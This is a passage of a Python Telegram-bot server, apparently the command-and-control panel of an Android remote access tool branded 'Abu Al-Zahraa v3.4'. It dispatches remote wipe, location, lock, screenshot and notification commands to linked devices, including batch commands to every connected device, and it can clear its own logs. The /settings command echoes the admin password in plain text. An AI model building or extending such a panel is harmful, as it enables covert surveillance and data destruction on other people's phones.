+   665→  1164→        for item in items[:3]:
+   666→  1165→            text += f"  /{item['cmd'].replace('get_','').replace('cmd_','')}\n"
+   667→  1166→        if len(items) > 3:
+   668→  1167→            text += f"  ...+{len(items)-3} more\n"
+   669→  1168→        text += "\n"
+   670→  1169→    
+   671→  1170→    text += "📱 /devices - قائمة الأجهزة\n🔗 /link - ربط جهاز\n"
+   672→  1171→    text += "📋 /menu - القائمة الرئيسية\n📊 /status - الحالة\n"
+   673→  1172→    text += "🔍 /search - بحث الأجهزة\n📊 /stats - الإحصائيات\n"
+   674→  1173→    text += "🔄 /all - أمر جماعي\n📢 /broadcast - إرسال عام\n"
+   675→  1174→    return text
+   676→  1175→
+   677→  1176→# ============================================================================
+   678→  1177→# COMMAND EXECUTOR
+   679→  1178→# ============================================================================
+   680→  1179→
+   681→  1180→async def execute_device_command(chat_id, device_id, cmd_name, params=None, msg_id=None):
+   682→  1181→    """Queue a command for a device and notify admin."""
+   683→  1182→    if not device_id or device_id == "none":
+   684→  1183→        await send_message(chat_id, "❌ لم يتم اختيار جهاز. استخدم /link أولاً.", reply_markup=build_main_menu())
+   685→  1184→        return
+   686→  1185→    
+   687→  1186→    d = find_device(device_id)
+   688→  1187→    if not d:
+   689→  1188→        await send_message(chat_id, f"❌ الجهاز <code>{device_id}</code> غير موجود.", reply_markup=build_main_menu())
+   690→  1189→        return
+   691→  1190→    
+   692→  1191→    cmd = await queue_command(device_id, cmd_name, params)
+   693→  1192→    reg = COMMAND_REGISTRY.get(cmd_name, {})
+   694→  1193→    desc = reg.get("desc", cmd_name)
+   695→  1194→    emoji = reg.get("emoji", "📋")
+   696→  1195→    
+   697→  1196→    text = (
+   698→  1197→        f"⏳ <b>جاري تنفيذ الأمر...</b>\n\n"
+   699→  1198→        f"📱 الجهاز: <code>{d.get('name', device_id)}</code>\n"
+   700→  1199→        f"📋 الأمر: {desc}\n"
+   701→  1200→        f"🆔 المعرف: <code>{cmd['id']}</code>\n\n"
+   702→  1201→        f"⏳ بانتظار استجابة الجهاز..."
+   703→  1202→    )
+   704→  1203→    
+   705→  1204→    kb = build_device_menu(device_id)
+   706→  1205→    
+   707→  1206→    # Save pending message reference for result updates
+   708→  1207→    pending_msg_id = msg_id  # If editing existing message, use its ID
+   709→  1208→    if msg_id:
+   710→  1209→        resp = await edit_message_text(chat_id, msg_id, text, reply_markup=kb)
+   711→  1210→        if not resp or not resp.get("ok"):
+   712→  1211→            # Edit failed (e.g., message too old), send new message
+   713→  1212→            resp = await send_message(chat_id, text, reply_markup=kb)
+   714→  1213→            if resp and resp.get("ok"):
+   715→  1214→                pending_msg_id = resp["result"]["message_id"]
+   716→  1215→    else:
+   717→  1216→        resp = await send_message(chat_id, text, reply_markup=kb)
+   718→  1217→        if resp and resp.get("ok"):
+   719→  1218→            pending_msg_id = resp["result"]["message_id"]
+   720→  1219→    
+   721→  1220→    # Track this pending message so we can edit it when result arrives
+   722→  1221→    if pending_msg_id:
+   723→  1222→        _pending_messages[cmd["id"]] = {"chat_id": chat_id, "message_id": pending_msg_id, "created_at": time.time()}
+   724→  1223→        log.info("Tracking pending message: cmd_id=%s msg_id=%d chat_id=%s", cmd["id"], pending_msg_id, chat_id)
+   725→  1224→
+   726→  1225→# ============================================================================
+   727→  1226→# TELEGRAM COMMAND HANDLER
+   728→  1227→# ============================================================================
+   729→  1228→
+   730→  1229→async def handle_telegram_command(chat_id, text, message_id=None):
+   731→  1230→    parts = text.strip().split(maxsplit=3)
+   732→  1231→    cmd = parts[0].lower()
+   733→  1232→    args = parts[1:] if len(parts) > 1 else []
+   734→  1233→    arg1 = args[0] if args else ""
+   735→  1234→    arg2 = args[1] if len(args) > 1 else ""
+   736→  1235→
+   737→  1236→    # === منع إرسال رسائل مكررة (Rate Limiting) ===
+   738→  1237→    now = time.time()
+   739→  1238→    last_time = _last_message_time.get(chat_id, 0)
+   740→  1239→    if now - last_time < RATE_LIMIT_SECONDS:
+   741→  1240→        log.warning("Rate limited: %s from %s", cmd, chat_id)
+   742→  1241→        return
+   743→  1242→    _last_message_time[chat_id] = now
+   744→  1243→
+   745→  1244→    # === Per-user rate limiting (20 commands per minute) ===
+   746→  1245→    if not check_user_rate_limit(chat_id):
+   747→  1246→        await send_message(chat_id, f"⏳ <b>تم تقييد السرعة</b>\n\nأنت تجاوزت الحد المسموح ({USER_RATE_LIMIT_MAX} أمر/دقيقة).\nيرجى الانتظار قليلاً ثم المحاولة مرة أخرى.", reply_markup=build_back_button())
+   748→  1247→        return
+   749→  1248→
+   750→  1249→    # Resolve device_id
+   751→  1250→    dev_id = arg1
+   752→  1251→    if not dev_id or not find_device(dev_id):
+   753→  1252→        d = get_first_device()
+   754→  1253→        dev_id = d["id"] if d else ""
+   755→  1254→
+   756→  1255→    log.info("CMD %s from %s: %s", cmd, chat_id, args)
+   757→  1256→    append_event("Telegram command", {"command": cmd, "args": args})
+   758→  1257→
+   759→  1258→    # ── Utility Commands ──
+   760→  1259→    if cmd == "/start":
+   761→  1260→        await handle_start(chat_id)
+   762→  1261→    elif cmd == "/help":
+   763→  1262→        text = build_help_menu()
+   764→  1263→        await send_message(chat_id, text, reply_markup=build_back_button())
+   765→  1264→    elif cmd == "/menu":
+   766→  1265→        await send_message(chat_id, "📋 <b>القائمة الرئيسية</b>\nاختر تصنيفاً:", reply_markup=build_main_menu())
+   767→  1266→    elif cmd == "/status":
+   768→  1267→        await handle_status(chat_id)
+   769→  1268→    elif cmd == "/about":
+   770→  1269→        await send_message(chat_id, (
+   771→  1270→            "🟥 <b>سيرفر أبو الزهراء v3.4</b>\n\n"
+   772→  1271→            "نظام إدارة الأجهزة المتكامل\n"
+   773→  1272→            f"النطاق: <code>{SERVER_DOMAIN}</code>\n"
+   774→  1273→            f"المنفذ: <code>{SERVER_PORT}</code>\n"
+   775→  1274→            f"الأوامر: <code>{len(COMMAND_REGISTRY)}</code>\n"
+   776→  1275→            f"وقت التشغيل: <code>{format_uptime(get_uptime())}</code>"
+   777→  1276→        ), reply_markup=build_back_button())
+   778→  1277→    elif cmd == "/version":
+   779→  1278→        await send_message(chat_id, "🟥 <b>أبو الزهراء v3.4</b>\nالإصدار: 2025.03\nالأوامر: 200+\nالمحرك: aiohttp", reply_markup=build_back_button())
+   780→  1279→    elif cmd == "/test":
+   781→  1280→        await send_message(chat_id, "✅ السيرفر يعمل!\n🟢 جميع الأنظمة تعمل.", reply_markup=build_back_button())
+   782→  1281→
+   783→  1282→    # ── Device Management ──
+   784→  1283→    elif cmd == "/devices":
+   785→  1284→        await handle_devices(chat_id)
+   786→  1285→    elif cmd == "/link":
+   787→  1286→        await handle_link(chat_id)
+   788→  1287→    elif cmd == "/unlink":
+   789→  1288→        await handle_unlink(chat_id, arg1)
+   790→  1289→    elif cmd == "/device":
+   791→  1290→        await handle_device_detail(chat_id, arg1)
+   792→  1291→    elif cmd == "/device_rename":
+   793→  1292→        if arg1 and arg2:
+   794→  1293→            if await update_device(arg1, {"name": arg2}):
+   795→  1294→                await send_message(chat_id, f"✅ تم إعادة تسمية الجهاز إلى <code>{arg2}</code>", reply_markup=build_back_button())
+   796→  1295→            else:
+   797→  1296→                await send_message(chat_id, "❌ الجهاز غير موجود", reply_markup=build_back_button())
+   798→  1297→        else:
+   799→  1298→            await send_message(chat_id, "الاستخدام: /device_rename معرف_الجهاز الاسم_الجديد", reply_markup=build_back_button())
+   800→  1299→    elif cmd == "/device_wipe":
+   801→  1300→        await execute_device_command(chat_id, dev_id, "wipe_data")
+   802→  1301→    elif cmd == "/device_locate":
+   803→  1302→        await execute_device_command(chat_id, dev_id, "get_location")
+   804→  1303→    elif cmd == "/device_lock":
+   805→  1304→        await execute_device_command(chat_id, dev_id, "lock_phone")
+   806→  1305→    elif cmd == "/device_ring":
+   807→  1306→        await execute_device_command(chat_id, dev_id, "ring")
+   808→  1307→    elif cmd == "/device_settings":
+   809→  1308→        d = find_device(dev_id)
+   810→  1309→        if d:
+   811→  1310→            await send_message(chat_id, f"⚙️ الإعدادات لجهاز <code>{d.get('name', dev_id)}</code>:\n{json.dumps(d, ensure_ascii=False, indent=2)[:2000]}", reply_markup=build_back_button())
+   812→  1311→        else:
+   813→  1312→            await send_message(chat_id, "❌ الجهاز غير موجود", reply_markup=build_back_button())
+   814→  1313→
+   815→  1314→    # ── Server Management ──
+   816→  1315→    elif cmd == "/server_status":
+   817→  1316→        await handle_status(chat_id)
+   818→  1317→    elif cmd == "/server_restart":
+   819→  1318→        await send_admin("🔄 تم طلب إعادة تشغيل السيرفر...")
+   820→  1319→        append_event("Server restart requested")
+   821→  1320→    elif cmd == "/clear_data":
+   822→  1321→        save_json(COMMANDS_FILE, [])
+   823→  1322→        save_json(EVENTS_FILE, [])
+   824→  1323→        await send_admin("✅ تم مسح قائمة الأوامر والأحداث", reply_markup=build_back_button())
+   825→  1324→    elif cmd == "/backup":
+   826→  1325→        await send_admin("💾 جارٍ إنشاء نسخة احتياطية...", reply_markup=build_back_button())
+   827→  1326→        append_event("Backup created")
+   828→  1327→    elif cmd == "/export":
+   829→  1328→        await send_admin("📤 بدأ التصدير", reply_markup=build_back_button())
+   830→  1329→    elif cmd == "/import":
+   831→  1330→        await send_admin("📥 جاهز للاستيراد", reply_markup=build_back_button())
+   832→  1331→    elif cmd == "/stats":
+   833→  1332→        devices = get_devices()
+   834→  1333→        online = sum(1 for d in devices if d.get("active"))
+   835→  1334→        cmds = load_json(COMMANDS_FILE, [])
+   836→  1335→        events = load_json(EVENTS_FILE, [])
+   837→  1336→        today_str = datetime.now(timezone.utc).strftime("%Y-%m-%d")
+   838→  1337→        cmds_today = sum(1 for c in cmds if c.get("created_at", "").startswith(today_str))
+   839→  1338→        events_today = sum(1 for e in events if e.get("time", "").startswith(today_str))
+   840→  1339→        pending = sum(1 for c in cmds if c.get("status") == "pending")
+   841→  1340→        done = sum(1 for c in cmds if c.get("status") in ("completed", "success"))
+   842→  1341→        text = (
+   843→  1342→            "📊 <b>لوحة الإحصائيات</b>\n\n"
+   844→  1343→            f"📱 الأجهزة: <b>{len(devices)}</b> (🟢 {online} متصل | 🔴 {len(devices)-online} غير متصل)\n"
+   845→  1344→            f"📋 الأوامر اليوم: <b>{cmds_today}</b>\n"
+   846→  1345→            f"⏳ معلّق: {pending} | ✅ مكتمل: {done}\n"
+   847→  1346→            f"📝 الأحداث اليوم: <b>{events_today}</b>\n"
+   848→  1347→            f"📨 الرسائل المرسلة: {messages_sent}\n"
+   849→  1348→            f"📡 طلبات API: {api_hits}\n"
+   850→  1349→            f"⏱️ وقت التشغيل: <b>{format_uptime(get_uptime())}</b>\n"
+   851→  1350→            f"🖥️ الإصدار: <b>v3.4</b>"
+   852→  1351→        )
+   853→  1352→        await send_message(chat_id, text, reply_markup=build_back_button())
+   854→  1353→    elif cmd == "/search":
+   855→  1354→        query = " ".join(parts[1:]) if len(parts) > 1 else ""
+   856→  1355→        if not query:
+   857→  1356→            await send_message(chat_id, "🔍 <b>بحث الأجهزة</b>\n\nالاستخدام: /search <كلمة البحث>\n\nيبحث بالاسم، الموديل، أو معرف الجهاز.", reply_markup=build_back_button())
+   858→  1357→            return
+   859→  1358→        devices = get_devices()
+   860→  1359→        query_lower = query.lower()
+   861→  1360→        results = [d for d in devices if
+   862→  1361→                   query_lower in d.get("name", "").lower() or
+   863→  1362→                   query_lower in d.get("model", "").lower() or
+   864→  1363→                   query_lower in d.get("id", "").lower() or
+   865→  1364→                   query_lower in d.get("brand", "").lower()]
+   866→  1365→        if not results:
+   867→  1366→            await send_message(chat_id, f"🔍 لم يتم العثور على أجهزة تطابق: <code>{query}</code>", reply_markup=build_back_button())
+   868→  1367→        else:
+   869→  1368→            kb_rows = []
+   870→  1369→            for d in results:
+   871→  1370→                status = "🟢" if d.get("active") else "🔴"
+   872→  1371→                name = d.get("name", d.get("id", "مجهول"))
+   873→  1372→                model = d.get("model", "")
+   874→  1373→                label = f"{status} {name}"
+   875→  1374→                if model and model != name:
+   876→  1375→                    label += f" ({model})"
+   877→  1376→                kb_rows.append([ib(label, f"dev_{d['id']}")])
+   878→  1377→            kb_rows.append([ib("🔙 رجوع", "back_main")])
+   879→  1378→            await send_message(chat_id, f"🔍 <b>نتائج البحث</b> ({len(results)} جهاز)\n\nكلمة البحث: <code>{query}</code>", reply_markup={"inline_keyboard": kb_rows})
+   880→  1379→    elif cmd == "/logs":
+   881→  1380→        events = load_json(EVENTS_FILE, [])[-20:]
+   882→  1381→        text = "📝 <b>السجلات الأخيرة</b>\n\n"
+   883→  1382→        for e in events:
+   884→  1383→            text += f"[{e.get('time','')}] {e.get('event','')}\n"
+   885→  1384→        await send_message(chat_id, text[:4000], reply_markup=build_back_button())
+   886→  1385→    elif cmd == "/clear_logs":
+   887→  1386→        save_json(EVENTS_FILE, [])
+   888→  1387→        await send_admin("✅ تم مسح السجلات", reply_markup=build_back_button())
+   889→  1388→    elif cmd == "/settings":
+   890→  1389→        s = load_settings()
+   891→  1390→        await send_message(chat_id, f"⚙️ <b>الإعدادات</b>\n\n<code>{json.dumps(s, ensure_ascii=False, indent=2)}</code>", reply_markup=build_back_button())
+   892→  1391→    elif cmd == "/set_password":
+   893→  1392→        if arg1:
+   894→  1393→            s = load_settings()
+   895→  1394→            s["admin_password"] = arg1
+   896→  1395→            await save_settings_data(s)
+   897→  1396→            await send_admin("✅ تم تغيير كلمة المرور", reply_markup=build_back_button())
+   898→  1397→        else:
+   899→  1398→            await send_admin("الاستخدام: /set_password كلمة_المرور_الجديدة", reply_markup=build_back_button())
+   900→  1399→    elif cmd == "/add_admin":
+   901→  1400→        await send_admin("استخدم /set_password لتغيير كلمة مرور الأدمن", reply_markup=build_back_button())
+   902→  1401→    elif cmd == "/remove_admin":
+   903→  1402→        await send_admin("الميزة غير متاحة في وضع الأدمن الواحد", reply_markup=build_back_button())
+   904→  1403→    elif cmd == "/broadcast":
+   905→  1404→        message_text = " ".join(parts[1:]) if len(parts) > 1 else ""
+   906→  1405→        if not message_text:
+   907→  1406→            await send_message(chat_id, "📢 <b>إرسال عام</b>\n\nالاستخدام: /broadcast <الرسالة>\n\nسيتم إرسال إشعار لجميع الأجهزة المتصلة.", reply_markup=build_back_button())
+   908→  1407→            return
+   909→  1408→        devices = get_devices()
+   910→  1409→        online_devices = [d for d in devices if d.get("active")]
+   911→  1410→        if not online_devices:
+   912→  1411→            await send_message(chat_id, "❌ لا توجد أجهزة متصلة حالياً.", reply_markup=build_back_button())
+   913→  1412→            return
+   914→  1413→        batch_id = str(uuid.uuid4())[:8]
+   915→  1414→        _batch_operations[batch_id] = {
+   916→  1415→            "total": len(online_devices),
+   917→  1416→            "responded": 0,
+   918→  1417→            "chat_id": chat_id,
+   919→  1418→            "msg_id": None,
+   920→  1419→            "created_at": time.time(),
+   921→  1420→            "command": "show_notification",
+   922→  1421→            "type": "broadcast",
+   923→  1422→        }
+   924→  1423→        for d in online_devices:
+   925→  1424→            cmd = await queue_command(d["id"], "show_notification", {"arg": message_text})
+   926→  1425→            # Track batch membership on each command
+   927→  1426→            _pending_messages[cmd["id"]] = {
+   928→  1427→                "chat_id": chat_id,
+   929→  1428→                "message_id": None,
+   930→  1429→                "created_at": time.time(),
+   931→  1430→                "batch_id": batch_id,
+   932→  1431→            }
+   933→  1432→        resp = await send_message(
+   934→  1433→            chat_id,
+   935→  1434→            f"📢 <b>إرسال عام</b>\n\n"
+   936→  1435→            f"📨 الرسالة: <code>{message_text[:200]}</code>\n"
+   937→  1436→            f"📱 الأجهزة المستهدفة: {len(online_devices)}\n"
+   938→  1437→            f"⏳ بانتظار الاستجابة... (0/{len(online_devices)})",
+   939→  1438→            reply_markup=build_back_button()
+   940→  1439→        )
+   941→  1440→        if resp and resp.get("ok"):
+   942→  1441→            _batch_operations[batch_id]["msg_id"] = resp["result"]["message_id"]
+   943→  1442→        append_event("Broadcast sent", {"devices": len(online_devices), "message": message_text[:100]})
+   944→  1443→    elif cmd == "/all":
+   945→  1444→        subcmd = arg1
+   946→  1445→        if not subcmd:
+   947→  1446→            await send_message(chat_id,
+   948→  1447→                "🔄 <b>أمر جماعي لجميع الأجهزة</b>\n\n"
+   949→  1448→                "الاستخدام: /all <أمر>\n\n"
+   950→  1449→                "مثال:\n"
+   951→  1450→                "  /all screenshot\n"
+   952→  1451→                "  /all location\n"
+   953→  1452→                "  /all battery\n"
+   954→  1453→                "  /all info\n"
+   955→  1454→                "  /all ping\n\n"
+   956→  1455→                "⚠️ سيتم إرسال الأمر لجميع الأجهزة <b>المتصلة</b> فقط.",
+   957→  1456→                reply_markup=build_back_button())
+   958→  1457→            return
+   959→  1458→        # Validate it's a known command
+   960→  1459→        reg = COMMAND_REGISTRY.get(subcmd)
+   961→  1460→        if not reg:
+   962→  1461→            await send_message(chat_id, f"❌ أمر غير معروف: <code>{subcmd}</code>\n\nاستخدم /help لعرض قائمة الأوامر المتاحة.", reply_markup=build_back_button())
+   963→  1462→            return
+   964→  1463→        devices = get_devices()
+   965→  1464→        online_devices = [d for d in devices if d.get("active")]
+   966→  1465→        if not online_devices:
+   967→  1466→            await send_message(chat_id, "❌ لا توجد أجهزة متصلة حالياً.", reply_markup=build_back_button())
+   968→  1467→            return
+   969→  1468→        batch_id = str(uuid.uuid4())[:8]
+   970→  1469→        _batch_operations[batch_id] = {
+   971→  1470→            "total": len(online_devices),
+   972→  1471→            "responded": 0,
+   973→  1472→            "chat_id": chat_id,
+   974→  1473→            "msg_id": None,
+   975→  1474→            "created_at": time.time(),
+   976→  1475→            "command": reg["cmd"],
+   977→  1476→            "type": "batch",
+   978→  1477→        }
+   979→  1478→        for d in online_devices:
+   980→  1479→            cmd = await queue_command(d["id"], reg["cmd"])
+   981→  1480→            _pending_messages[cmd["id"]] = {
+   982→  1481→                "chat_id": chat_id,
+   983→  1482→                "message_id": None,
+   984→  1483→                "created_at": time.time(),
+   985→  1484→                "batch_id": batch_id,
+   986→  1485→            }
+   987→  1486→        resp = await send_message(
+   988→  1487→            chat_id,
+   989→  1488→            f"🔄 <b>أمر جماعي</b>\n\n"
+   990→  1489→            f"📋 الأمر: {reg['desc']}\n"
+   991→  1490→            f"📱 الأجهزة المستهدفة: {len(online_devices)}\n"
+   992→  1491→            f"⏳ بانتظار الاستجابة... (0/{len(online_devices)})",
+   993→  1492→            reply_markup=build_back_button()
+   994→  1493→        )
+   995→  1494→        if resp and resp.get("ok"):
+   996→  1495→            _batch_operations[batch_id]["msg_id"] = resp["result"]["message_id"]
+   997→  1496→        append_event("Batch command", {"command": subcmd, "devices": len(online_devices)})
+   998→  1497→    elif cmd == "/maintenance":
+   999→  1498→        s = load_settings()
+  1000→  1499→        s["maintenance"] = not s.get("maintenance", False)
+  1001→  1500→        await save_settings_data(s)
+  1002→
+  1003→[showing lines 500-1500 of 5555; use offset=1501 with limit to continue reading]
